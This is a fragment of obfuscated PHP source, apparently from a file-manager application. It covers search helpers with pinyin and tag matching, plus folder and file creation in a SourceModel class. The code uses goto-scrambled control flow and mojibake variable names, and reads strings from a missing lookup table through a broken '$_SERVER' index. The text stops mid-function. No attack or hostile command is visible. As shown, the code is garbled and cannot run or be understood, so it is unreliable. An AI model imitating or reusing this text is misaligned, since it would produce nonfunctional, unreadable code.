$c—ÉÒÎ©¨ = $EÙëÓ°Ö¯¶[2321]; $Bè‘ŒßÌ½è = $c—ÉÒÎ©¨; goto CÛÛš–ÎÏ; F÷”°»Ø¦Š: $this->_listSearchDesc($CŠæœ‹ÕÂÑ, $c›ò»í´¡§, $Bè‘ŒßÌ½è); $this->_listSearchTag($CŠæœ‹ÕÂÑ, $c›ò»í´¡§, $Bè‘ŒßÌ½è); $this->_listSearchGroupTag($CŠæœ‹ÕÂÑ, $c›ò»í´¡§, $Bè‘ŒßÌ½è); goto A›ˆ¬¹Ñ¤“; CÛÛš–ÎÏ: $this->_listSearchBindPinyin($c›ò»í´¡§, $D—ªĞ­…±, $c—ÉÒÎ©¨); $this->alias($EÙëÓ°Ö¯¶[489])->_makeOrder()->cache(null, 10); $CŠæœ‹ÕÂÑ = $this->distinct(!0)->field($c—ÉÒÎ©¨)->where($D—ªĞ­…±)->selectPage($d²ßËšÔ´š); goto F÷”°»Ø¦Š; f¤¾„±ô¼¸: $EÙëÓ°Ö¯¶ =& $_SERVER[“]; if (isset($c›ò»í´¡§[$EÙëÓ°Ö¯¶[2176]]) && $c›ò»í´¡§[$EÙëÓ°Ö¯¶[2176]]) { $c›ò»í´¡§[$EÙëÓ°Ö¯¶[2176]] = str_replace($EÙëÓ°Ö¯¶[1579], $EÙëÓ°Ö¯¶[2320], trim($c›ò»í´¡§[$EÙëÓ°Ö¯¶[2176]])); } $D—ªĞ­…± = $this->_parseSearchWhere($c›ò»í´¡§); goto f¤îõ¬Á·é; BŠéŒ¡õ: } private function _listSearchTag(&$dğß™‡³Š„, $Bß‰à¤Šï¤, $fïĞá¿†§‡) { goto d£¯‹ŞªÌ; FÒ©›Í÷†: $BœöÇè‘ø = array(); $DÄ°ÑÕ¯ë = $Bß‰à¤Šï¤[$bš»á–Âˆ[2176]]; foreach ($fó—Á°›‘• as $cËÎÖé¶ëì) { $Cô§œ©Í–Ò = $cËÎÖé¶ëì[$bš»á–Âˆ[28]]; $BŞÈæ¾’Ÿ = str_replace($bš»á–Âˆ[50], $bš»á–Âˆ[33], Pinyin::encode($Cô§œ©Í–Ò)); if (stripos($Cô§œ©Í–Ò, $DÄ°ÑÕ¯ë) !== !1 || stripos($BŞÈæ¾’Ÿ, $DÄ°ÑÕ¯ë) !== !1) { $BœöÇè‘ø[] = $cËÎÖé¶ëì[$bš»á–Âˆ[367]]; } } goto CòâÕŸ‰ã°; d£¯‹ŞªÌ: $bš»á–Âˆ =& $_SERVER[“]; if (!$Bß‰à¤Šï¤[$bš»á–Âˆ[2176]] || $dğß™‡³Š„[$bš»á–Âˆ[351]][$bš»á–Âˆ[340]] > 1) { return; } $fó—Á°›‘• = Model($bš»á–Âˆ[2322])->listData(); goto FÒ©›Í÷†; CòâÕŸ‰ã°: if (!$BœöÇè‘ø) { return; } $F¡Šòí¶ = array($bš»á–Âˆ[393] => array($bš»á–Âˆ[7], $BœöÇè‘ø), $bš»á–Âˆ[1423] => USER_ID); $fòïšùŠ´ß = Model($bš»á–Âˆ[394])->field($bš»á–Âˆ[75])->where($F¡Šòí¶)->select(); goto aŞ„ŒãÑ; aŞ„ŒãÑ: $fòïšùŠ´ß = array_to_keyvalue($fòïšùŠ´ß, $bš»á–Âˆ[33], $bš»á–Âˆ[75]); $Dº¶³Æ‘± = array_unique($fòïšùŠ´ß); $this->_listSearchMerge($dğß™‡³Š„, $Bß‰à¤Šï¤, $fïĞá¿†§‡, $Dº¶³Æ‘±); goto A’É§‡ÉçÁ; A’É§‡ÉçÁ: } private function _listSearchDesc(&$EĞáÈŸ§¡, $Bæ¥Õ«Á«, $C…¨İËÙò) { goto CÙš­£ôø×; dÙìƒ á‹ø: $DïÅÛ÷©ìÑ = Model($FÑÂÑÄ»¥„[506])->field($FÑÂÑÄ»¥„[369])->where($dì¾¼¸ŠÌÀ)->select(); $eºÛºÙ³¿­ = array_to_keyvalue($DïÅÛ÷©ìÑ, $FÑÂÑÄ»¥„[33], $FÑÂÑÄ»¥„[369]); $this->_listSearchMerge($EĞáÈŸ§¡, $Bæ¥Õ«Á«, $C…¨İËÙò, $eºÛºÙ³¿­); goto f¡×Ÿà„ÕŠ; CÙš­£ôø×: $FÑÂÑÄ»¥„ =& $_SERVER[“]; if (!$Bæ¥Õ«Á«[$FÑÂÑÄ»¥„[2176]] || $EĞáÈŸ§¡[$FÑÂÑÄ»¥„[351]][$FÑÂÑÄ»¥„[340]] > 1) { return; } $c¢Âë‰÷™‹ = $this->listSearchChildren($Bæ¥Õ«Á«[$FÑÂÑÄ»¥„[463]]); goto E…á½‘éØŠ; E…á½‘éØŠ: $c¢Âë‰÷™‹ = array_unique($c¢Âë‰÷™‹); if (!$c¢Âë‰÷™‹) { return; } $dì¾¼¸ŠÌÀ = array($FÑÂÑÄ»¥„[369] => array($FÑÂÑÄ»¥„[7], $c¢Âë‰÷™‹), $FÑÂÑÄ»¥„[89] => $FÑÂÑÄ»¥„[405], $FÑÂÑÄ»¥„[359] => array($FÑÂÑÄ»¥„[735], $FÑÂÑÄ»¥„[2178] . $Bæ¥Õ«Á«[$FÑÂÑÄ»¥„[2176]] . $FÑÂÑÄ»¥„[2178])); goto dÙìƒ á‹ø; f¡×Ÿà„ÕŠ: } private function _listSearchGroupTag(&$fï…ˆÀÜœ, $a‰Ë™µ‚µ´, $Añ‚â¦ã¦) { goto eöÚçí„’ô; aòßİãõÇÛ: $a±Ü¹®Ä¢ = array_to_keyvalue($a±Ü¹®Ä¢, $E¿÷óÕĞ¾[33], $E¿÷óÕĞ¾[75]); $Aã°ÒÌ¡– = array_unique($a±Ü¹®Ä¢); $this->_listSearchMerge($fï…ˆÀÜœ, $a‰Ë™µ‚µ´, $Añ‚â¦ã¦, $Aã°ÒÌ¡–); goto Aì†Œ ’¸ˆ; eöÚçí„’ô: $E¿÷óÕĞ¾ =& $_SERVER[“]; if (!$a‰Ë™µ‚µ´[$E¿÷óÕĞ¾[2176]] || $fï…ˆÀÜœ[$E¿÷óÕĞ¾[351]][$E¿÷óÕĞ¾[340]] > 1 || !$a‰Ë™µ‚µ´[$E¿÷óÕĞ¾[463]]) { return; } $BŸ…Î³¯ĞÕ = $this->sourceInfo($a‰Ë™µ‚µ´[$E¿÷óÕĞ¾[463]]); goto D‘¦§Ş•Æ; bğÅÒ Á÷÷: $BÚ÷íÓÓ Í = array(); $F¼Àä‹Ş«Š = $a‰Ë™µ‚µ´[$E¿÷óÕĞ¾[2176]]; foreach ($eñ¿¶‡÷[$E¿÷óÕĞ¾[354]] as $d²Û“ˆÔÛƒ) { $C¥†–Â¼Òš = $d²Û“ˆÔÛƒ[$E¿÷óÕĞ¾[28]]; $f¡®á½ÌÜ× = str_replace($E¿÷óÕĞ¾[50], $E¿÷óÕĞ¾[33], Pinyin::encode($C¥†–Â¼Òš)); if (stripos($C¥†–Â¼Òš, $F¼Àä‹Ş«Š) !== !1 || stripos($f¡®á½ÌÜ×, $F¼Àä‹Ş«Š) !== !1) { $BÚ÷íÓÓ Í[] = $d²Û“ˆÔÛƒ[$E¿÷óÕĞ¾[367]]; } } goto dïö·Ã Ğ; dïö·Ã Ğ: if (!$BÚ÷íÓÓ Í) { return; } $BàÆÚã¹³‘ = array($E¿÷óÕĞ¾[393] => array($E¿÷óÕĞ¾[7], $BÚ÷íÓÓ Í), $E¿÷óÕĞ¾[1423] => 0, $E¿÷óÕĞ¾[29] => $E¿÷óÕĞ¾[2196] . $F²½©›™ò); $a±Ü¹®Ä¢ = Model($E¿÷óÕĞ¾[394])->field($E¿÷óÕĞ¾[75])->where($BàÆÚã¹³‘)->select(); goto aòßİãõÇÛ; D‘¦§Ş•Æ: if (!$BŸ…Î³¯ĞÕ || $BŸ…Î³¯ĞÕ[$E¿÷óÕĞ¾[371]] != SourceModel::TYPE_GROUP) { return; } $F²½©›™ò = $BŸ…Î³¯ĞÕ[$E¿÷óÕĞ¾[458]]; $eñ¿¶‡÷ = Model($E¿÷óÕĞ¾[2323])->get($F²½©›™ò); goto bğÅÒ Á÷÷; Aì†Œ ’¸ˆ: } private function _listSearchMerge(&$F¯±éË­ƒÅ, $d¶ ½ùÊöƒ, $A³ÍÜ¬¿ˆ¶, $CçáÂ÷ñŒ) { goto DÀÙñ‡ˆÄĞ; c²ëÌŒ½š: foreach ($bùŠ‚ì‚îò as $CÜ‰³±†¡³) { $fÆÏŒ¨Óê‘ = $Eœ¥ÎÁÏñ [47] . $d¶ ½ùÊöƒ[$Eœ¥ÎÁÏñ [463]] . $Eœ¥ÎÁÏñ [47]; if (stripos($CÜ‰³±†¡³[$Eœ¥ÎÁÏñ [461]], $fÆÏŒ¨Óê‘) !== !1) { $F“ã„ñÁêõ[] = $CÜ‰³±†¡³; } } $F¯±éË­ƒÅ[$Eœ¥ÎÁÏñ [354]] = array_merge($F“ã„ñÁêõ, $F¯±éË­ƒÅ[$Eœ¥ÎÁÏñ [354]]); $F¯±éË­ƒÅ[$Eœ¥ÎÁÏñ [351]][$Eœ¥ÎÁÏñ [352]] += count($F“ã„ñÁêõ); goto eÔö·¹œ·; EÜ”‰Î’¤: $bùŠ‚ì‚îò = $this->field($A³ÍÜ¬¿ˆ¶)->where($eİŠ»İ³Â¿)->select(); if (!$bùŠ‚ì‚îò) { return; } $F“ã„ñÁêõ = array(); goto c²ëÌŒ½š; aÂÓ²ã¡™: $bÅé†îÈ» = array_diff($CçáÂ÷ñŒ, $CÌæ­©Ö®‰); if (!$bÅé†îÈ») { return; } $eİŠ»İ³Â¿ = array($Eœ¥ÎÁÏñ [369] => array($Eœ¥ÎÁÏñ [7], $bÅé†îÈ»)); goto EÜ”‰Î’¤; DÀÙñ‡ˆÄĞ: $Eœ¥ÎÁÏñ  =& $_SERVER[“]; if (!$CçáÂ÷ñŒ) { return; } $CÌæ­©Ö®‰ = array_to_keyvalue($F¯±éË­ƒÅ[$Eœ¥ÎÁÏñ [354]], $Eœ¥ÎÁÏñ [33], $Eœ¥ÎÁÏñ [369]); goto aÂÓ²ã¡™; eÔö·¹œ·: } public function listSearchChildren($F¥¡·³Ú®, $C½¹Óòíš­ = 5000) { goto BÀÄªÓÚ¦; BÀÄªÓÚ¦: $C·ÂÅİâä‘ =& $_SERVER[“]; $B…³Ş‰¿½Á = array(); $b›‰”Ø˜Ÿø = $this->sourceInfo($F¥¡·³Ú®); goto Dğ»§”¹ Ÿ; aàØÃÅŞÁ‘: $b™·¡Öã = $this->field($C·ÂÅİâä‘[369])->where($DÒÕĞƒêÖ)->select(); $B…³Ş‰¿½Á = array_to_keyvalue($b™·¡Öã, $C·ÂÅİâä‘[33], $C·ÂÅİâä‘[369]); return $B…³Ş‰¿½Á; goto d™®Å¼Œ£; Dğ»§”¹ Ÿ: $DÒÕĞƒêÖ = array($C·ÂÅİâä‘[461] => array($C·ÂÅİâä‘[735], $b›‰”Ø˜Ÿø[$C·ÂÅİâä‘[461]] . $b›‰”Ø˜Ÿø[$C·ÂÅİâä‘[369]] . $C·ÂÅİâä‘[486])); $bêºé²ßÁ = $this->field($C·ÂÅİâä‘[369])->cache(null, 600)->where($DÒÕĞƒêÖ)->count(); if ($bêºé²ßÁ > $C½¹Óòíš­) { return $this->_listSearchChildrenNear($F¥¡·³Ú®, $C½¹Óòíš­); } goto aàØÃÅŞÁ‘; d™®Å¼Œ£: } private function _listSearchChildrenNear($B‚«™ÚÜ¼, $E×¶Ü”šë®) { goto cóˆµÂîì; dóë¡·ÃÎ: $e¼·Íİ¤è = array_merge($e¼·Íİ¤è, array_to_keyvalue($F¡’ë¶ñ‹˜, $a­¹©…Üö„[33], $a­¹©…Üö„[369])); $e¼·Íİ¤è = array_slice($e¼·Íİ¤è, 0, $E×¶Ü”šë®); return $e¼·Íİ¤è; goto FïóëÜ­Éô; cºŠê¤Æ¼: $F¡’ë¶ñ‹˜ = $this->field($a­¹©…Üö„[2324])->where($BÌ—×²Ù•)->select(); $b‚è×ììğ‚ = array_to_keyvalue(array_filter_by_field($F¡’ë¶ñ‹˜, $a­¹©…Üö„[370], $a­¹©…Üö„[83]), $a­¹©…Üö„[33], $a­¹©…Üö„[369]); $e¼·Íİ¤è = array_merge($e¼·Íİ¤è, array_to_keyvalue($F¡’ë¶ñ‹˜, $a­¹©…Üö„[33], $a­¹©…Üö„[369])); goto DØ»ÜóçĞ‘; DØ»ÜóçĞ‘: if (!$b‚è×ììğ‚) { return $e¼·Íİ¤è; } $BÌ—×²Ù• = array($a­¹©…Üö„[463] => array($a­¹©…Üö„[7], $b‚è×ììğ‚)); $F¡’ë¶ñ‹˜ = $this->field($a­¹©…Üö„[2324])->where($BÌ—×²Ù•)->select(); goto dóë¡·ÃÎ; cóˆµÂîì: $a­¹©…Üö„ =& $_SERVER[“]; $e¼·Íİ¤è = array(); $BÌ—×²Ù• = array($a­¹©…Üö„[463] => $B‚«™ÚÜ¼); goto cºŠê¤Æ¼; FïóëÜ­Éô: } private function _listSearchBindPinyin($A°´Ùš±ïŞ, &$a†ù°Ë×, &$CŸØÈ„š¡Ó) { goto f¡ˆ®öñèï; f¡ˆ®öñèï: $D…Ûç†Ä±ê =& $_SERVER[“]; if (!Input::check($A°´Ùš±ïŞ[$D…Ûç†Ä±ê[2176]], $D…Ûç†Ä±ê[306]) || strlen($A°´Ùš±ïŞ[$D…Ûç†Ä±ê[2176]]) < 2) { return; } $bà“ó‡ÕÚÇ = "\114\x45\106\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\x69\157\x5f\163\157\x75\162\x63\x65\137\x6d\x65\164\x61\40\x6d\145\x74\141\x20\x6f\x6e\x20\x73\x6f\165\x72\143\x65\56\x73\x6f\x75\x72\143\x65\x49\104\x20\75\x20\155\145\164\141\x2e\163\x6f\165\162\x63\145\x49\104"; goto c“å¦ï‚˜—; FĞ‘áÂôô¬: unset($a†ù°Ë×[$D…Ûç†Ä±ê[28]]); foreach ($a†ù°Ë× as $fƒÃëêŒåñ => $d—Ã²–®¯) { $c‹½ã¿õ’—[$D…Ûç†Ä±ê[2326] . $fƒÃëêŒåñ] = $d—Ã²–®¯; } $céÌ¤âÆ¼ = array($D…Ûç†Ä±ê[485], $D…Ûç†Ä±ê[2178] . $A°´Ùš±ïŞ[$D…Ûç†Ä±ê[2176]] . $D…Ûç†Ä±ê[2178]); goto AóÙª´’²ó; c“å¦ï‚˜—: $c‹½ã¿õ’— = array(); $CŸØÈ„š¡Ó = str_replace(array($D…Ûç†Ä±ê[217], $D…Ûç†Ä±ê[50], $D…Ûç†Ä±ê[2325]), $D…Ûç†Ä±ê[33], $CŸØÈ„š¡Ó); $CŸØÈ„š¡Ó = $D…Ûç†Ä±ê[2326] . str_replace($D…Ûç†Ä±ê[47], $D…Ûç†Ä±ê[2327], $CŸØÈ„š¡Ó); goto FĞ‘áÂôô¬; AóÙª´’²ó: $c‹½ã¿õ’—[] = array($D…Ûç†Ä±ê[2328] => $céÌ¤âÆ¼, $D…Ûç†Ä±ê[900] => $D…Ûç†Ä±ê[2180], array($D…Ûç†Ä±ê[2329] => $céÌ¤âÆ¼, $D…Ûç†Ä±ê[2330] => array($D…Ûç†Ä±ê[7], array($D…Ûç†Ä±ê[416], $D…Ûç†Ä±ê[415])))); $this->join($bà“ó‡ÕÚÇ); $a†ù°Ë× = $c‹½ã¿õ’—; goto FÆ¾è©½õ; FÆ¾è©½õ: } private function _parseSearchWhere($D®ƒ óõîÇ) { goto C‹»ñ²ñë÷; C‹»ñ²ñë÷: $f”ÁŒ‹ö¢ =& $_SERVER[“]; $d°¥Ï³“Úµ = array(); if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[686]])) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[107]] = array($f”ÁŒ‹ö¢[2331], $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[686]]); } goto eò¥¬å¤¼Í; eò¥¬å¤¼Í: if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[449]])) { $eìà½¥ÈŠ… = array($f”ÁŒ‹ö¢[2332], $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[449]]); if ($d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[107]]) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[107]] = array($d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[107]], $eìà½¥ÈŠ…, $f”ÁŒ‹ö¢[2333]); } else { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[107]] = $eìà½¥ÈŠ…; } } if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2334]])) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[77]] = array($f”ÁŒ‹ö¢[2331], $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2334]]); } if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2335]])) { $eìà½¥ÈŠ… = array($f”ÁŒ‹ö¢[2332], $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2335]]); if ($d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[77]]) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[77]] = array($d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[77]], $eìà½¥ÈŠ…, $f”ÁŒ‹ö¢[2333]); } else { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[77]] = $eìà½¥ÈŠ…; } } goto dÄàµÖ”Ãô; dÄàµÖ”Ãô: if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[537]])) { $d°¥Ï³“Úµ[] = array($f”ÁŒ‹ö¢[379] => $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[537]], $f”ÁŒ‹ö¢[378] => $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[537]], $f”ÁŒ‹ö¢[900] => $f”ÁŒ‹ö¢[2180]); } if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[372]])) { $CË·ßŞèÂ¢ = $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[372]]; if ($CË·ßŞèÂ¢ == $f”ÁŒ‹ö¢[76]) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[370]] = 1; } else { if ($CË·ßŞèÂ¢ == $f”ÁŒ‹ö¢[2336]) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[370]] = 0; } else { if ($CË·ßŞèÂ¢) { $CË·ßŞèÂ¢ = is_array($CË·ßŞèÂ¢) ? $CË·ßŞèÂ¢ : explode($f”ÁŒ‹ö¢[47], $CË·ßŞèÂ¢); $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[372]] = array($f”ÁŒ‹ö¢[384], $CË·ßŞèÂ¢); $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[370]] = 0; } } } } if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[463]])) { $C½Ç’ªŠ“Š = $this->sourceInfo($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[463]]); $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[527]] = array($f”ÁŒ‹ö¢[485], $C½Ç’ªŠ“Š[$f”ÁŒ‹ö¢[461]] . $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[463]] . $f”ÁŒ‹ö¢[486]); } goto B¶ÆÊ‡‰®¿; B¶ÆÊ‡‰®¿: if (isset($D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2176]]) && $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2176]]) { $d¨ä‹çÙïâ = $D®ƒ óõîÇ[$f”ÁŒ‹ö¢[2176]]; $F¢Ç™ÌÌ¯Â = explode($f”ÁŒ‹ö¢[50], $d¨ä‹çÙïâ); if (strlen($d¨ä‹çÙïâ) > 2 && (substr($d¨ä‹çÙïâ, 0, 1) == $f”ÁŒ‹ö¢[113] && substr($d¨ä‹çÙïâ, -1) == $f”ÁŒ‹ö¢[113]) || substr($d¨ä‹çÙïâ, 0, 1) == $f”ÁŒ‹ö¢[55] && substr($d¨ä‹çÙïâ, -1) == $f”ÁŒ‹ö¢[55]) { $d¨ä‹çÙïâ = substr($d¨ä‹çÙïâ, 1, -1); $F¢Ç™ÌÌ¯Â = array($d¨ä‹çÙïâ); } $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[28]] = array($f”ÁŒ‹ö¢[485], $f”ÁŒ‹ö¢[2178] . $d¨ä‹çÙïâ . $f”ÁŒ‹ö¢[2178]); if (count($F¢Ç™ÌÌ¯Â) > 1) { $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[28]] = array(); foreach ($F¢Ç™ÌÌ¯Â as $aóİÅŸ²ãŠ) { if (!trim($aóİÅŸ²ãŠ)) { continue; } $d°¥Ï³“Úµ[$f”ÁŒ‹ö¢[28]][] = array($f”ÁŒ‹ö¢[485], $f”ÁŒ‹ö¢[2178] . trim($aóİÅŸ²ãŠ) . $f”ÁŒ‹ö¢[2178]); } } } return $d°¥Ï³“Úµ; goto EØª¢³˜ëˆ; EØª¢³˜ëˆ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E‡ºãÚ‹†ù) { $b¾å¾ˆ—Ğ± =& $_SERVER[“]; $DÆÑÍ˜ß = Model($b¾å¾ˆ—Ğ±[476])->where(array($b¾å¾ˆ—Ğ±[1413] => $E‡ºãÚ‹†ù))->find(); $eÎÜÈ«¨é© = $this->_mkdirRoot(SourceModel::TYPE_USER, $E‡ºãÚ‹†ù, $DÆÑÍ˜ß[$b¾å¾ˆ—Ğ±[28]]); $this->userDesktopAdd($eÎÜÈ«¨é©); return $eÎÜÈ«¨é©; } public function userDesktopAdd($dè¿ŒˆÏñ…) { $BÄÌë³Ï£â =& $_SERVER[“]; $Aà˜‹Æîµ = LNG($BÄÌë³Ï£â[2337]); $døÉÏ‹İÚ = $this->mkdir($dè¿ŒˆÏñ…, $Aà˜‹Æîµ); $this->metaSet($døÉÏ‹İÚ, $BÄÌë³Ï£â[2338], $BÄÌë³Ï£â[83]); $this->metaSet($dè¿ŒˆÏñ…, $BÄÌë³Ï£â[2339], $døÉÏ‹İÚ); } public function groupRootAdd($f½Ñº‘šğ¿) { $a˜—¼Šà­ =& $_SERVER[“]; $a¹ªùâ¶é… = Model($a˜—¼Šà­[460])->where(array($a˜—¼Šà­[2172] => $f½Ñº‘šğ¿))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f½Ñº‘šğ¿, $a¹ªùâ¶é…[$a˜—¼Šà­[28]]); } public function systemRootPathAdd($D‡º‘‚ÔÎœ) { if ($D‡º‘‚ÔÎœ != $_SERVER[“][1076]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $D‡º‘‚ÔÎœ); } public function userRootRemove($cÂ¢æÁÃòĞ) { $Bñ–Û˜…Õò = $this->sourceRoot(SourceModel::TYPE_USER, $cÂ¢æÁÃòĞ); if (!$Bñ–Û˜…Õò) { return; } $this->remove($Bñ–Û˜…Õò, !1); } public function groupRootRemove($f “Ğˆ‘°õ) { $F¶¿™”–Ó§ = $this->sourceRoot(SourceModel::TYPE_GROUP, $f “Ğˆ‘°õ); if (!$F¶¿™”–Ó§) { return; } $this->remove($F¶¿™”–Ó§, !1); } private function _mkdirRoot($cº¬¦Ëİ½‚, $DÈ²Š½áê«, $c± ¤äÊ) { goto BÎàéŠ‹È¢; fŠ¤ò«”…: $Dƒ§íÓ‚Ê¿ = $this->add($fÚ¦ÒöªÒ); $cÌå‘Ï¡‘— = array($eÙé¯©œÆ[529] => short_id($Dƒ§íÓ‚Ê¿)); $this->where(array($eÙé¯©œÆ[383] => $Dƒ§íÓ‚Ê¿))->save($cÌå‘Ï¡‘—); goto d´±¸áô†; cÎ©‰÷ŞÈË: $b‰ß¿ï¯® = "\x4d\157\x64\x65\x6c\x53\x6f\165\x72\143\x65\x2e\155\x6b\x64\x69\162\122\x6f\157\x74\56{$cº¬¦Ëİ½‚}\56{$DÈ²Š½áê«}\56" . $c± ¤äÊ; CacheLock::lock($b‰ß¿ï¯®); $fÚ¦ÒöªÒ[$eÙé¯©œÆ[28]] = $c± ¤äÊ; goto fŠ¤ò«”…; BÎàéŠ‹È¢: $eÙé¯©œÆ =& $_SERVER[“]; $fÚ¦ÒöªÒ = array($eÙé¯©œÆ[368] => 0, $eÙé¯©œÆ[523] => $cº¬¦Ëİ½‚, $eÙé¯©œÆ[524] => $DÈ²Š½áê«, $eÙé¯©œÆ[520] => 1, $eÙé¯©œÆ[525] => USER_ID, $eÙé¯©œÆ[526] => USER_ID, $eÙé¯©œÆ[521] => $eÙé¯©œÆ[33], $eÙé¯©œÆ[527] => $eÙé¯©œÆ[472], $eÙé¯©œÆ[396] => 0, $eÙé¯©œÆ[522] => 0, $eÙé¯©œÆ[420] => 0, $eÙé¯©œÆ[528] => $eÙé¯©œÆ[33]); if ($B’Ğ­®õŞÏ = $this->where($fÚ¦ÒöªÒ)->find()) { return $B’Ğ­®õŞÏ[$eÙé¯©œÆ[369]]; } goto cÎ©‰÷ŞÈË; d´±¸áô†: CacheLock::unlock($b‰ß¿ï¯®); return $Dƒ§íÓ‚Ê¿; goto DŒŸÂÕÃç£; DŒŸÂÕÃç£: } private function sourceRoot($DÊŸ§Ø…‹¾, $a©ÄÖÎ›¤ğ, $bğ ÚæòÔ = false) { $eË¿ˆñõ =& $_SERVER[“]; $a‘º¼¯–ôƒ = array($eË¿ˆñõ[368] => 0, $eË¿ˆñõ[523] => $DÊŸ§Ø…‹¾, $eË¿ˆñõ[524] => $a©ÄÖÎ›¤ğ); if ($A‹òİĞ¾Ûã = $this->where($a‘º¼¯–ôƒ)->find()) { return $bğ ÚæòÔ ? $A‹òİĞ¾Ûã : $A‹òİĞ¾Ûã[$eË¿ˆñõ[369]]; } return !1; } public function sourceRootGroup($eÈÂøç‡çÆ) { $b™ò±ñ¶“™ =& $_SERVER[“]; if (is_string($eÈÂøç‡çÆ)) { $eÈÂøç‡çÆ = array($eÈÂøç‡çÆ); } $cÓ§‘§¼Æ÷ = array($b™ò±ñ¶“™[368] => 0, $b™ò±ñ¶“™[523] => SourceModel::TYPE_GROUP, $b™ò±ñ¶“™[524] => array($b™ò±ñ¶“™[7], $eÈÂøç‡çÆ)); $F”ºË†•²ß = $this->listSource($cÓ§‘§¼Æ÷, 1000); return array_to_keyvalue($F”ºË†•²ß[$b™ò±ñ¶“™[74]], $b™ò±ñ¶“™[458]); } public function mkfile($eîÚÃ²‰ê¡, $CÊ¶îÄê£, $e¬·Ü‚Æ…Ø = '', $FÕ½¤ã°± = REPEAT_RENAME) { $Dš½‡ö–ÉÌ =& $_SERVER[“]; $fœ•Å‘Èò = Model($Dš½‡ö–ÉÌ[546])->addFileByContent($e¬·Ü‚Æ…Ø, $CÊ¶îÄê£); return $this->_createFileCall($eîÚÃ²‰ê¡, $CÊ¶îÄê£, $fœ•Å‘Èò, $FÕ½¤ã°±, $Dš½‡ö–ÉÌ[1113]); } public function addFile($fóÍÔ¤Úç, $eã–ëÄÀÅ‹, $e¯ŸĞ¸‡Á, $fƒß¯ãÉìÀ = false, $fÒíÎÉ±äÄ = REPEAT_RENAME) { $CÒÈõéÄµª = Model($_SERVER[“][546])->addFile($eã–ëÄÀÅ‹, $e¯ŸĞ¸‡Á, $fƒß¯ãÉìÀ); return $this->_createFileCall($fóÍÔ¤Úç, $e¯ŸĞ¸‡Á, $CÒÈõéÄµª, $fÒíÎÉ±äÄ); } public function addFileByFileID($B¨®­¿ôŠ·, $båµÙùøùï, $e‘óÁˆÛ¿ë, $Aà¿³Â‘ = REPEAT_RENAME) { $aÀ¿Ã‡ÓÆ =& $_SERVER[“]; $aÕ£×æÁ¶î = Model($aÀ¿Ã‡ÓÆ[546])->find($båµÙùøùï); Model($aÀ¿Ã‡ÓÆ[546])->linkAdd($båµÙùøùï); return $this->_createFileCall($B¨®­¿ôŠ·, $e‘óÁˆÛ¿ë, $aÕ£×æÁ¶î, $Aà¿³Â‘); } public function addFileByRemote($D‰¼×ˆå, $cÜ’¦¦®É£, $B¯ŒàÖàÓ•, $bˆ¶í÷± = array(), $D¸ÕÃ‘±øÔ = REPEAT_RENAME) { $báğ¿°‰Ä× = Model($_SERVER[“][546])->addFileByRemote($cÜ’¦¦®É£, $B¯ŒàÖàÓ•, $bˆ¶í÷±); return $this->_createFileCall($D‰¼×ˆå, $B¯ŒàÖàÓ•, $báğ¿°‰Ä×, $D¸ÕÃ‘±øÔ); } private function _createFileCall($E¥»¡ğºò¼, $Aã„ë‘¢ãí, $A°æÂõ±Ò½, $fÇİåªòéä, $AâØƒø›Ö = "\165\x70\x6c\x6f\141\144") { goto D«ˆµ† İ; DğÈŠô‘‘à: return $e¤åÁ©; goto b¨±ñÇö…“; D«ˆµ† İ: $Bù¦®ó«× =& $_SERVER[“]; $dàæ‡Ú‘™¬ = !1; $this->lockWriteStart($E¥»¡ğºò¼, $Aã„ë‘¢ãí); goto dÆË¯ìãˆ; dÆË¯ìãˆ: $e¤åÁ© = $this->_createFile($E¥»¡ğºò¼, $Aã„ë‘¢ãí, $A°æÂõ±Ò½, $fÇİåªòéä, $dàæ‡Ú‘™¬); if (!$dàæ‡Ú‘™¬) { Model($Bù¦®ó«×[422])->remove($A°æÂõ±Ò½[$Bù¦®ó«×[419]]); } else { if ($e¤åÁ©) { Model($Bù¦®ó«×[2309])->eventCreate($e¤åÁ©, $AâØƒø›Ö); } } $this->lockWriteEnd($E¥»¡ğºò¼, $Aã„ë‘¢ãí); goto DğÈŠô‘‘à; b¨±ñÇö…“: } public function mkdir($FÍ¹ô†‹’, $e‚ß–†ôÌá, $b±Îõ†„­„ = REPEAT_SKIP) { goto Aßà²Óˆ; Aßà²Óˆ: $CòÊ¡›©– =& $_SERVER[“]; 